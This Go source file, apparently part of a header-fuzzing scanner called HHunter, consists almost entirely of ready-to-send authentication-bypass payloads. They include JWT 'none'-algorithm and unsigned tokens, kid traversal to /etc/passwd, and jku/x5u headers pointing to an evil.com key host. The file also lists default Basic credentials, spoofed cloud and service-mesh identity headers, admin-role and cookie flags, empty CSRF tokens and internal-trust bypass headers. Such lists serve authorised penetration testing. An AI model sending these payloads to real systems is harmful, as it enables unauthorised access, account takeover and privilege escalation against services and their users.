package headers

import "github.com/cc1a2b/HHunter/engine"

func GetAuthMutations() []engine.Mutation {
	return []engine.Mutation{
		// ===================================================================
		// Bearer Token Manipulation
		// ===================================================================
		{Header: "Authorization", Value: "Bearer null", Category: "Auth", Impact: "Auth Bypass - Null Token"},
		{Header: "Authorization", Value: "Bearer undefined", Category: "Auth", Impact: "Auth Bypass - Undefined Token"},
		{Header: "Authorization", Value: "Bearer ", Category: "Auth", Impact: "Auth Bypass - Empty Bearer"},
		{Header: "Authorization", Value: "Bearer admin", Category: "Auth", Impact: "Auth Bypass - Admin Token"},
		{Header: "Authorization", Value: "Bearer test", Category: "Auth", Impact: "Auth Bypass - Test Token"},
		{Header: "Authorization", Value: "Bearer guest", Category: "Auth", Impact: "Auth Bypass - Guest Token"},
		{Header: "Authorization", Value: "Bearer 000000", Category: "Auth", Impact: "Auth Bypass - Zero Token"},
		{Header: "Authorization", Value: "Bearer true", Category: "Auth", Impact: "Auth Bypass - Boolean Token"},
		{Header: "Authorization", Value: "Bearer 1", Category: "Auth", Impact: "Auth Bypass - Numeric Token"},
		{Header: "Authorization", Value: "Bearer -1", Category: "Auth", Impact: "Auth Bypass - Negative Token"},
		{Header: "Authorization", Value: "Bearer []", Category: "Auth", Impact: "Auth Bypass - Array Token"},
		{Header: "Authorization", Value: "Bearer {}", Category: "Auth", Impact: "Auth Bypass - Object Token"},
		{Header: "Authorization", Value: "Bearer aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", Category: "Auth", Impact: "Auth Bypass - Repeated Chars"},
		{Header: "Authorization", Value: "", Category: "Auth", Impact: "Auth Bypass - Empty Header"},
		{Header: "Authorization", Value: "Basic", Category: "Auth", Impact: "Auth Bypass - Basic No Creds"},
		{Header: "Authorization", Value: "Digest", Category: "Auth", Impact: "Auth Bypass - Digest No Creds"},
		{Header: "Authorization", Value: "NTLM", Category: "Auth", Impact: "Auth Bypass - NTLM No Creds"},
		{Header: "Authorization", Value: "Negotiate", Category: "Auth", Impact: "Auth Bypass - Negotiate"},

		// ===================================================================
		// JWT Manipulation — Algorithm Confusion & Bypass
		// ===================================================================
		// JWT none algorithm bypass (CVE-2015-9235)
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.", Category: "Auth", Impact: "JWT none Algorithm Bypass"},
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.", Category: "Auth", Impact: "JWT None Case Variant Bypass"},
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.", Category: "Auth", Impact: "JWT NONE Uppercase Bypass"},
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.", Category: "Auth", Impact: "JWT nOnE Mixed Case Bypass"},

		// JWT with empty signature
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.", Category: "Auth", Impact: "JWT Empty Signature"},

		// JWT with common weak secrets (signed with "secret", "password", "key", etc.)
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.PJrEQDIxJzsCvMl8Esyi06TGRtP9n4KSl1MFpQJKMKk", Category: "Auth", Impact: "JWT Weak Secret 'secret'"},
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.9kpnlIg_aJt7k3pGBBr0hHn9RLbIG4Hn0EIKxRTfmrA", Category: "Auth", Impact: "JWT Weak Secret 'password'"},

		// JWT kid header manipulation (directory traversal)
		{Header: "Authorization", Value: `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.`, Category: "Auth", Impact: "JWT kid Traversal /dev/null"},
		{Header: "Authorization", Value: `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.`, Category: "Auth", Impact: "JWT kid Traversal /etc/passwd"},

		// JWT jku/x5u header poisoning
		{Header: "Authorization", Value: `Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS9qd2tzIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.`, Category: "Auth", Impact: "JWT jku Header Poisoning"},
		{Header: "Authorization", Value: `Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9ldmlsLmNvbS9jZXJ0In0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.`, Category: "Auth", Impact: "JWT x5u Header Poisoning"},

		// JWT sub/role claim manipulation
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.n-axN79c4TdJTsFBNPNuGzJ8-7PfQ3J4pWmAsxGWPVU", Category: "Auth", Impact: "JWT Admin Role Claim (sub=0)"},

		// ===================================================================
		// Basic Auth Manipulation
		// ===================================================================
		{Header: "Authorization", Value: "Basic Og==", Category: "Auth", Impact: "Auth Bypass - Empty Basic"},
		{Header: "Authorization", Value: "Basic YWRtaW46YWRtaW4=", Category: "Auth", Impact: "Auth Bypass - admin:admin"},
		{Header: "Authorization", Value: "Basic YWRtaW46", Category: "Auth", Impact: "Auth Bypass - admin:empty"},
		{Header: "Authorization", Value: "Basic OnBhc3N3b3Jk", Category: "Auth", Impact: "Auth Bypass - empty:password"},
		{Header: "Authorization", Value: "Basic dGVzdDp0ZXN0", Category: "Auth", Impact: "Auth Bypass - test:test"},
		{Header: "Authorization", Value: "Basic cm9vdDpyb290", Category: "Auth", Impact: "Auth Bypass - root:root"},
		{Header: "Authorization", Value: "Basic Z3Vlc3Q6Z3Vlc3Q=", Category: "Auth", Impact: "Auth Bypass - guest:guest"},
		{Header: "Authorization", Value: "Basic YWRtaW46cGFzc3dvcmQ=", Category: "Auth", Impact: "Auth Bypass - admin:password"},
		{Header: "Authorization", Value: "Basic YWRtaW46MTIzNDU2", Category: "Auth", Impact: "Auth Bypass - admin:123456"},
		{Header: "Authorization", Value: "Basic YWRtaW46cGFzc3dvcmQx", Category: "Auth", Impact: "Auth Bypass - admin:password1"},
		{Header: "Authorization", Value: "Basic YWRtaW5pc3RyYXRvcjphZG1pbg==", Category: "Auth", Impact: "Auth Bypass - administrator:admin"},

		// ===================================================================
		// Alternative Auth Headers — Comprehensive Coverage
		// ===================================================================
		{Header: "X-Authorization", Value: "Bearer admin", Category: "Auth", Impact: "Auth Bypass via X-Authorization"},
		{Header: "X-Auth", Value: "admin", Category: "Auth", Impact: "Auth Bypass via X-Auth"},
		{Header: "X-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass via X-Token"},
		{Header: "X-API-Key", Value: "admin", Category: "Auth", Impact: "Auth Bypass via API Key"},
		{Header: "X-API-Key", Value: "test", Category: "Auth", Impact: "Auth Bypass via Test API Key"},
		{Header: "X-API-Key", Value: "000000", Category: "Auth", Impact: "Auth Bypass via Zero API Key"},
		{Header: "X-API-Key", Value: "null", Category: "Auth", Impact: "Auth Bypass via Null API Key"},
		{Header: "X-API-Key", Value: "undefined", Category: "Auth", Impact: "Auth Bypass via Undefined API Key"},
		{Header: "X-API-Key", Value: "internal", Category: "Auth", Impact: "Auth Bypass via Internal API Key"},
		{Header: "X-API-Key", Value: "master", Category: "Auth", Impact: "Auth Bypass via Master API Key"},
		{Header: "X-Api-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Api-Token"},
		{Header: "X-Auth-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass via X-Auth-Token"},
		{Header: "X-Auth-Token", Value: "000000", Category: "Auth", Impact: "Auth Bypass via Zero Auth-Token"},
		{Header: "X-Auth-Token", Value: "null", Category: "Auth", Impact: "Auth Bypass via Null Auth-Token"},
		{Header: "X-Access-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass via X-Access-Token"},
		{Header: "X-Access-Token", Value: "test", Category: "Auth", Impact: "Auth Bypass via Test Access-Token"},
		{Header: "X-Session-Token", Value: "000000", Category: "Auth", Impact: "Auth Bypass via Zero Session-Token"},
		{Header: "X-Session-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Admin Session-Token"},
		{Header: "X-Session-Id", Value: "1", Category: "Auth", Impact: "Auth Bypass via Session-Id"},
		{Header: "X-Session-Id", Value: "0", Category: "Auth", Impact: "Auth Bypass via Zero Session-Id"},
		{Header: "Api-Key", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Api-Key"},
		{Header: "Apikey", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Apikey"},
		{Header: "Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Token"},
		{Header: "Auth", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Auth"},
		{Header: "Secret", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Secret"},
		{Header: "X-Secret", Value: "admin", Category: "Auth", Impact: "Auth Bypass via X-Secret"},
		{Header: "X-Gateway-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass via Gateway-Token"},
		{Header: "X-Service-Token", Value: "internal", Category: "Auth", Impact: "Auth Bypass via Service-Token"},

		// ===================================================================
		// OAuth2 Token Manipulation
		// ===================================================================
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.e30.", Category: "Auth", Impact: "OAuth2 Empty Claims Token"},
		{Header: "X-OAuth-Token", Value: "invalid_token_probe", Category: "Auth", Impact: "OAuth2 Token Header Probe"},
		{Header: "X-OAuth-Scopes", Value: "admin write delete", Category: "Auth", Impact: "OAuth2 Scope Escalation"},
		{Header: "X-OAuth-Client-ID", Value: "admin-client", Category: "Auth", Impact: "OAuth2 Client ID Manipulation"},
		{Header: "X-Token-Scope", Value: "admin:all", Category: "Auth", Impact: "OAuth2 Token Scope Override"},

		// ===================================================================
		// IDOR via User ID Headers
		// ===================================================================
		{Header: "X-User-Id", Value: "1", Category: "Auth", Impact: "IDOR - User ID 1"},
		{Header: "X-User-Id", Value: "0", Category: "Auth", Impact: "IDOR - User ID 0"},
		{Header: "X-User-Id", Value: "-1", Category: "Auth", Impact: "IDOR - User ID -1"},
		{Header: "X-User-Id", Value: "admin", Category: "Auth", Impact: "IDOR - User ID admin"},
		{Header: "X-User-Id", Value: "root", Category: "Auth", Impact: "IDOR - User ID root"},
		{Header: "X-User-Id", Value: "999999", Category: "Auth", Impact: "IDOR - User ID Overflow"},
		{Header: "X-User-ID", Value: "1", Category: "Auth", Impact: "IDOR - Case Variant User-ID"},
		{Header: "X-Userid", Value: "1", Category: "Auth", Impact: "IDOR - Case Variant Userid"},
		{Header: "X-Account-Id", Value: "1", Category: "Auth", Impact: "IDOR - Account ID 1"},
		{Header: "X-Account-Id", Value: "0", Category: "Auth", Impact: "IDOR - Account ID 0"},
		{Header: "X-Tenant-Id", Value: "1", Category: "Auth", Impact: "IDOR - Tenant ID 1"},
		{Header: "X-Org-Id", Value: "1", Category: "Auth", Impact: "IDOR - Org ID 1"},
		{Header: "X-Company-Id", Value: "1", Category: "Auth", Impact: "IDOR - Company ID 1"},

		// UUID-based IDOR
		{Header: "X-User-Id", Value: "00000000-0000-0000-0000-000000000001", Category: "Auth", Impact: "IDOR - UUID User ID 1"},
		{Header: "X-Account-Id", Value: "00000000-0000-0000-0000-000000000001", Category: "Auth", Impact: "IDOR - UUID Account ID 1"},

		// ===================================================================
		// Username / Identity Headers
		// ===================================================================
		{Header: "X-User", Value: "admin", Category: "Auth", Impact: "Auth Confusion - X-User admin"},
		{Header: "X-User", Value: "root", Category: "Auth", Impact: "Auth Confusion - X-User root"},
		{Header: "X-User", Value: "system", Category: "Auth", Impact: "Auth Confusion - X-User system"},
		{Header: "X-Username", Value: "admin", Category: "Auth", Impact: "Auth Confusion - Username admin"},
		{Header: "X-Username", Value: "administrator", Category: "Auth", Impact: "Auth Confusion - Username administrator"},
		{Header: "X-Email", Value: "admin@localhost", Category: "Auth", Impact: "Auth Confusion - Admin Email"},
		{Header: "X-Login", Value: "admin", Category: "Auth", Impact: "Auth Confusion - Login admin"},
		{Header: "X-Identity", Value: "admin", Category: "Auth", Impact: "Auth Confusion - Identity admin"},
		{Header: "X-Consumer-Username", Value: "admin", Category: "Auth", Impact: "Auth Confusion - Kong Consumer admin"},
		{Header: "X-Consumer-ID", Value: "1", Category: "Auth", Impact: "Auth Confusion - Kong Consumer ID"},
		{Header: "X-Authenticated-UserId", Value: "admin", Category: "Auth", Impact: "Auth Confusion - Authenticated UserID"},
		{Header: "X-Authenticated-Groups", Value: "admin", Category: "Auth", Impact: "Auth Confusion - Authenticated Groups"},

		// Envoy/Istio service mesh auth headers
		{Header: "X-Envoy-Downstream-Service-Node", Value: "admin-service", Category: "Auth", Impact: "Envoy Service Node Spoof"},
		{Header: "X-Envoy-Original-Dst-Host", Value: "internal-admin:8080", Category: "Auth", Impact: "Envoy Original Dest Spoof"},
		{Header: "X-Istio-Attributes", Value: "admin", Category: "Auth", Impact: "Istio Attributes Spoof"},

		// AWS/Cloud identity headers
		{Header: "X-Amzn-Oidc-Identity", Value: "admin", Category: "Auth", Impact: "AWS ALB OIDC Identity Spoof"},
		{Header: "X-Amzn-Oidc-Data", Value: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.", Category: "Auth", Impact: "AWS ALB OIDC Data Spoof"},
		{Header: "X-Amzn-Oidc-Accesstoken", Value: "admin-token", Category: "Auth", Impact: "AWS ALB OIDC Token Spoof"},
		{Header: "X-Goog-Authenticated-User-Email", Value: "admin@company.com", Category: "Auth", Impact: "GCP IAP Email Spoof"},
		{Header: "X-Goog-Authenticated-User-Id", Value: "1", Category: "Auth", Impact: "GCP IAP User ID Spoof"},
		{Header: "X-MS-CLIENT-PRINCIPAL-NAME", Value: "admin@company.com", Category: "Auth", Impact: "Azure AD Principal Name Spoof"},
		{Header: "X-MS-CLIENT-PRINCIPAL-ID", Value: "admin-id", Category: "Auth", Impact: "Azure AD Principal ID Spoof"},

		// ===================================================================
		// Privilege Escalation Headers
		// ===================================================================
		{Header: "X-Role", Value: "admin", Category: "Auth", Impact: "Privilege Escalation - Role admin"},
		{Header: "X-Role", Value: "administrator", Category: "Auth", Impact: "Privilege Escalation - Role administrator"},
		{Header: "X-Role", Value: "superuser", Category: "Auth", Impact: "Privilege Escalation - Role superuser"},
		{Header: "X-Role", Value: "root", Category: "Auth", Impact: "Privilege Escalation - Role root"},
		{Header: "X-Role", Value: "system", Category: "Auth", Impact: "Privilege Escalation - Role system"},
		{Header: "X-Roles", Value: "admin,user", Category: "Auth", Impact: "Privilege Escalation - Multi-Role"},
		{Header: "X-Admin", Value: "true", Category: "Auth", Impact: "Privilege Escalation - X-Admin true"},
		{Header: "X-Admin", Value: "1", Category: "Auth", Impact: "Privilege Escalation - X-Admin 1"},
		{Header: "X-Admin", Value: "yes", Category: "Auth", Impact: "Privilege Escalation - X-Admin yes"},
		{Header: "X-Is-Admin", Value: "true", Category: "Auth", Impact: "Privilege Escalation - X-Is-Admin"},
		{Header: "X-Privilege", Value: "admin", Category: "Auth", Impact: "Privilege Escalation - X-Privilege"},
		{Header: "X-Privilege-Level", Value: "9", Category: "Auth", Impact: "Privilege Escalation - Level 9"},
		{Header: "X-Permission", Value: "admin", Category: "Auth", Impact: "Privilege Escalation - X-Permission"},
		{Header: "X-Permissions", Value: "*", Category: "Auth", Impact: "Privilege Escalation - Wildcard Permissions"},
		{Header: "X-Scope", Value: "admin", Category: "Auth", Impact: "Privilege Escalation - Admin Scope"},
		{Header: "X-Scopes", Value: "read write admin delete", Category: "Auth", Impact: "Privilege Escalation - Full Scopes"},
		{Header: "X-Group", Value: "admin", Category: "Auth", Impact: "Privilege Escalation - Admin Group"},
		{Header: "X-Groups", Value: "administrators", Category: "Auth", Impact: "Privilege Escalation - Administrators Group"},
		{Header: "X-ACL", Value: "admin", Category: "Auth", Impact: "Privilege Escalation - Admin ACL"},
		{Header: "X-Feature-Flags", Value: "admin,debug,internal", Category: "Auth", Impact: "Privilege Escalation - Feature Flags"},
		{Header: "X-Subscription-Plan", Value: "enterprise", Category: "Auth", Impact: "Privilege Escalation - Plan Override"},
		{Header: "X-Tier", Value: "premium", Category: "Auth", Impact: "Privilege Escalation - Tier Override"},

		// ===================================================================
		// Cookie-based Auth Bypass
		// ===================================================================
		{Header: "Cookie", Value: "admin=true", Category: "Auth", Impact: "Cookie Auth Bypass - admin=true"},
		{Header: "Cookie", Value: "admin=1", Category: "Auth", Impact: "Cookie Auth Bypass - admin=1"},
		{Header: "Cookie", Value: "role=admin", Category: "Auth", Impact: "Cookie Auth Bypass - role=admin"},
		{Header: "Cookie", Value: "isAdmin=1", Category: "Auth", Impact: "Cookie Auth Bypass - isAdmin=1"},
		{Header: "Cookie", Value: "isAdmin=true", Category: "Auth", Impact: "Cookie Auth Bypass - isAdmin=true"},
		{Header: "Cookie", Value: "user=admin", Category: "Auth", Impact: "Cookie Auth Bypass - user=admin"},
		{Header: "Cookie", Value: "username=admin", Category: "Auth", Impact: "Cookie Auth Bypass - username=admin"},
		{Header: "Cookie", Value: "user_id=1", Category: "Auth", Impact: "Cookie IDOR - user_id=1"},
		{Header: "Cookie", Value: "user_id=0", Category: "Auth", Impact: "Cookie IDOR - user_id=0"},
		{Header: "Cookie", Value: "authenticated=true", Category: "Auth", Impact: "Cookie Auth Bypass - authenticated=true"},
		{Header: "Cookie", Value: "auth=1", Category: "Auth", Impact: "Cookie Auth Bypass - auth=1"},
		{Header: "Cookie", Value: "logged_in=1", Category: "Auth", Impact: "Cookie Auth Bypass - logged_in=1"},
		{Header: "Cookie", Value: "session=admin", Category: "Auth", Impact: "Cookie Auth Bypass - session=admin"},
		{Header: "Cookie", Value: "privilege=admin", Category: "Auth", Impact: "Cookie Priv Escalation"},
		{Header: "Cookie", Value: "access_level=admin", Category: "Auth", Impact: "Cookie Access Level admin"},
		{Header: "Cookie", Value: "jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.", Category: "Auth", Impact: "Cookie JWT none Algorithm"},

		// ===================================================================
		// CSRF Bypass
		// ===================================================================
		{Header: "X-CSRF-Token", Value: "", Category: "Auth", Impact: "CSRF Bypass - Empty Token"},
		{Header: "X-CSRF-Token", Value: "null", Category: "Auth", Impact: "CSRF Bypass - Null Token"},
		{Header: "X-CSRF-Token", Value: "undefined", Category: "Auth", Impact: "CSRF Bypass - Undefined Token"},
		{Header: "X-CSRF-Token", Value: "0", Category: "Auth", Impact: "CSRF Bypass - Zero Token"},
		{Header: "X-XSRF-Token", Value: "", Category: "Auth", Impact: "CSRF Bypass - Empty XSRF"},
		{Header: "X-XSRF-Token", Value: "null", Category: "Auth", Impact: "CSRF Bypass - Null XSRF"},
		{Header: "Csrf-Token", Value: "", Category: "Auth", Impact: "CSRF Bypass - Empty Csrf-Token"},
		{Header: "X-Csrf", Value: "", Category: "Auth", Impact: "CSRF Bypass - Empty X-Csrf"},
		{Header: "Anti-Csrf-Token", Value: "", Category: "Auth", Impact: "CSRF Bypass - Empty Anti-CSRF"},

		// ===================================================================
		// Internal / Service Auth — Microservice Trust Exploitation
		// ===================================================================
		{Header: "X-Internal", Value: "true", Category: "Auth", Impact: "Internal Auth - X-Internal"},
		{Header: "X-Internal-Auth", Value: "true", Category: "Auth", Impact: "Internal Auth - X-Internal-Auth"},
		{Header: "X-Service-Auth", Value: "internal", Category: "Auth", Impact: "Internal Auth - Service Auth"},
		{Header: "X-Microservice", Value: "true", Category: "Auth", Impact: "Internal Auth - Microservice"},
		{Header: "X-Internal-Request", Value: "1", Category: "Auth", Impact: "Internal Auth - Internal Request"},
		{Header: "X-Trusted-Source", Value: "true", Category: "Auth", Impact: "Internal Auth - Trusted Source"},
		{Header: "X-Backend-Bypass", Value: "true", Category: "Auth", Impact: "Internal Auth - Backend Bypass"},
		{Header: "X-Debug-Auth", Value: "true", Category: "Auth", Impact: "Internal Auth - Debug Auth"},
		{Header: "X-Forwarded-Service", Value: "auth-service", Category: "Auth", Impact: "Internal Auth - Forwarded Service"},
		{Header: "X-Service-Name", Value: "admin-panel", Category: "Auth", Impact: "Internal Auth - Service Name"},
		{Header: "X-Request-From", Value: "internal-gateway", Category: "Auth", Impact: "Internal Auth - Request From Gateway"},
		{Header: "X-Bypass-Auth", Value: "1", Category: "Auth", Impact: "Internal Auth - Bypass Auth"},
		{Header: "X-Skip-Auth", Value: "true", Category: "Auth", Impact: "Internal Auth - Skip Auth"},
		{Header: "X-No-Auth", Value: "true", Category: "Auth", Impact: "Internal Auth - No Auth"},
		{Header: "X-Auth-Bypass", Value: "true", Category: "Auth", Impact: "Internal Auth - Auth Bypass Header"},
	}
}
